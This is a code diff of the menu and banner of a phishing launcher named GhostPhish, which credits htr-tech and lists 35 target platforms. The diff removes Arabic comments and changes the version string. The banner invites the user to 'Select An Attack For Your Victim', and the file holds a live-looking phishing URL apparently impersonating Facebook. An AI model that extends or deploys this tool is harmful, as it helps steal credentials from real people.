@@ -32,7 +32,6 @@ PLATFORMS = {
 LINKS = {i: "" for i in range(1, 36)}
 LINKS[1] = "https://facebook-vjj9.onrender.com"
 
-# عرض العمود الثابت لضمان استقامة الصفوف
 COL_WIDTH = 26
 
 def clear_screen():
@@ -49,9 +48,8 @@ def load_or_create_secret():
     return secret
 
 def fmt_entry(num, name):
-    """تنسيق مدخل واحد مع ألوان وحشو ثابت"""
     colored = f"{RED}[{WHITE}{num:02d}{RED}]{RESET} {ORANGE}{name}{RESET}"
-    plain_len = len(f"[{num:02d}] {name}")  # طول النص بدون أكواد الألوان
+    plain_len = len(f"[{num:02d}] {name}")
     padding = COL_WIDTH - plain_len
     if padding < 0:
         padding = 0
@@ -66,26 +64,21 @@ def print_banner():
 \____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
 {RESET}"""
     print(banner)
-    print(WHITE + "Version : 2.3.5" + RESET)
+    print(WHITE + "General : 1.0" + RESET)
     print(WHITE + "[–] Tool Created by htr-tech (tahmid.rayat)" + RESET)
     print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
     print(ORANGE + "غافل الغراب" + RESET)
 
 def print_menu():
-    # الصفوف من 1 إلى 10 (ثلاثة أعمدة)
     for i in range(1, 11):
         col1 = fmt_entry(i, PLATFORMS[i])
         col2 = fmt_entry(i + 10, PLATFORMS[i + 10])
         col3 = fmt_entry(i + 20, PLATFORMS[i + 20])
         print(col1 + col2 + col3)
 
-    # الصف 31, 32, 33
     print(fmt_entry(31, PLATFORMS[31]) + fmt_entry(32, PLATFORMS[32]) + fmt_entry(33, PLATFORMS[33]))
-
-    # الصف 34, 35 (عمودان فقط، والثالث فارغ)
     print(fmt_entry(34, PLATFORMS[34]) + fmt_entry(35, PLATFORMS[35]))
 
-    # سطر About و Exit
     print(f"{RED}[{WHITE}99{RED}]{RESET} {WHITE}About{RESET}    {RED}[{WHITE}00{RED}]{RESET} {WHITE}Exit{RESET}")
     print(WHITE + "[–] Select an option : " + RESET, end="")
 
@@ -141,7 +134,7 @@ def main():
         if choice == "99":
             clear_screen()
             print_banner()
-            print(f"{WHITE}هذه أداة GhostPhish – إصدار 2.3.5{RESET}")
+            print(f"{WHITE}هذه أداة GhostPhish – إصدار 1.0{RESET}")
             input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
             clear_screen()
             print_banner()
